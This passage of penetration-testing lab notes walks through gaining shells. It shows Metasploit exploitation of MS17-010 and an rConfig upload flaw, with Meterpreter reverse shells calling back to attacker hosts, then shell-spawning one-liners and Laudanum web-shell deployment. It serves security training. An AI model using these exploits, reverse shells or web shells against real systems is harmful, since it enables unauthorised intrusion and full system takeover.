|   Workgroup: WORKGROUP\x00
|_  System time: 2021-09-27T15:13:28-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-27T22:13:30
|_  start_date: 2021-09-23T15:29:29

...

msf6 > search eternal

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   2  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   3  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   4  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

...

msf6 > use 2
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) > options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.86.48    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

...

msf6 exploit(windows/smb/ms17_010_psexec) > show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave bl
                                                                ank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                10.129.201.97                yes       The target host(s), range CIDR identifier, or h
                                                                osts file with syntax 'file:<path>'
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to to be used on target for
                                                                 pretty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                (ADMIN$,C$,...) or a normal read/write folder s
                                                                hare
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.12      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

...

msf6 exploit(windows/smb/ms17_010_psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.12:4444 
[*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393
[*] 10.129.201.97:445 - Built a write-what-where primitive...
[+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained!
[*] 10.129.201.97:445 - Selecting PowerShell target
[*] 10.129.201.97:445 - Executing the payload...
[+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.201.97
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
meterpreter > 

...

meterpreter > shell

Process 4844 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Unix/Linux

### Considerations

- What distro of Linux is the system running?
- What shell & programming languages exist on the system?
- What function is the system serving for the network environment it is on?
- What application is the system hosting?
- Are there any known vulns?

### Example

```bash
d41y@htb[/htb]$ nmap -sC -sV 10.129.201.101

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 09:09 EDT
Nmap scan report for 10.129.201.101
Host is up (0.11s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Did not follow redirect to https://10.129.201.101/
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2021-09-24T19:29:26
|_Not valid after:  2022-09-24T19:29:26
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql    MySQL (unauthorized)
```

Inspecting web-ports leads to finding a network configuration management tool called rConfig.

Taking a look a the web login page, you can see the rConfig version number. You can use the version number to research for publicly available exploits. You can also search on msfconsole:

```bash
msf6 > search rconfig

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/solr_velocity_rce             2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
   1  auxiliary/gather/nuuo_cms_file_download          2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   2  exploit/linux/http/rconfig_ajaxarchivefiles_rce  2020-03-11       good       Yes    Rconfig 3.x Chained Remote Code Execution
   3  exploit/unix/webapp/rconfig_install_cmd_exec     2019-10-28       excellent  Yes    rConfig install Command Execution

...

msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce

...

msf6 exploit(linux/http/rconfig_vendors_auth_file_upload_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.111:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] 3.9.6 of rConfig found !
[+] The target appears to be vulnerable. Vulnerable version of rConfig found !
[+] We successfully logged in !
[*] Uploading file 'olxapybdo.php' containing the payload...
[*] Triggering the payload ...
[*] Sending stage (39282 bytes) to 10.129.201.101
[+] Deleted olxapybdo.php
[*] Meterpreter session 1 opened (10.10.14.111:4444 -> 10.129.201.101:38860) at 2021-09-27 13:49:34 -0400

meterpreter > dir
Listing: /home/rconfig/www/images/vendor
========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  673   fil   2020-09-03 05:49:58 -0400  ajax-loader.gif
100644/rw-r--r--  1027  fil   2020-09-03 05:49:58 -0400  cisco.jpg
100644/rw-r--r--  1017  fil   2020-09-03 05:49:58 -0400  juniper.jpg

...

meterpreter > shell

Process 3958 created.
Channel 0 created.
dir
ajax-loader.gif  cisco.jpg  juniper.jpg
ls
ajax-loader.gif
cisco.jpg
juniper.jpg
```

### Spawning a TTY Shell with Python

When you drop into the system shell, you notice that no prompt is present, yet you can still issue some system commands. This is a shell typically referred to as a non-tty shell. These shells have limited functionality and can often prevent your use of essential commands like su and sudo, which you will likely need if you seek to escalate privileges. This happened because the payload was executed on the target by the apache user. Your session is established as the apache user. Normally, admins are not accessing the system as the apache user, so there is no need for a shell interpreter language to be defined in the environment variable associated with apache.

You can manually spawn a TTY shell using Python it it is present on the system.

```bash
python -c 'import pty; pty.spawn("/bin/sh")' 

sh-4.2$         
sh-4.2$ whoami
whoami
apache
```

## Spawning Interactive Shells

Sometimes your initial shell will be limited (_also referred to as a jail shell_).

There may be times that you land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that you could use several different methods to spawn an interactive shell.

### /bin/sh -i

```bash
/bin/sh -i
sh: no job control in this shell
sh-4.2$
```

### Perl

If the programming language Perl is present on the system, these commands will execute the shell interpreter specified.

```bash
perl —e 'exec "/bin/sh";'
```

The following command should be run from a script:

```bash
perl: exec "/bin/sh";
```

### Ruby

If the programming language Ruby is present on the system, this command will execute the shell interpreter specified.

The following command should be run from a script:

```bash
ruby: exec "/bin/sh"
```

### Lua

If the programming language Lua is present on the system, you can use the ```os.execute``` method to execute the shell interpreter specified using the full command:

```bash
lua: os.execute('/bin/sh')
```

### AWK

... can be used to spawn an interactive shell.

```bash
awk 'BEGIN {system("/bin/sh")}'
```

### Find

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

### Exec

```bash
find . -exec /bin/sh \; -quit
``` 

### VIM

To shell:

```bash
vim -c ':!/bin/sh'
```

Escaping:

```bash
vim
:set shell=/bin/sh
:shell
```

### Checking sudo Permissions

```bash
sudo -l
Matching Defaults entries for apache on ILF-WebSrv:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on ILF-WebSrv:
    (ALL : ALL) NOPASSWD: ALL
```

## Web Shells

A web shell is a browser-based shell session you can use to interact with the underlying OS of a web server. Again, to gain RCE via web shell, you must first find a website or web application vuln that can give you file upload capabilities. Most web shells are gained by uploading a payload written in a web language on the target server. The payload(s) you upload should give you RCE capability within the browser.

### Laudanum

... is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web app languages to include asp, aspx, jsp, php, and more. This is a staple to have on any pentest.

#### Usage

```bash
d41y@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```

Add your IP address to the ```allowedIps``` variable on line 59.

Now, you need to find a web app vulnerable to file upload (_ideally, one which also shows the upload path_) and navigate to it.

Now, you should be able to use the input field for commands and interact with the target.

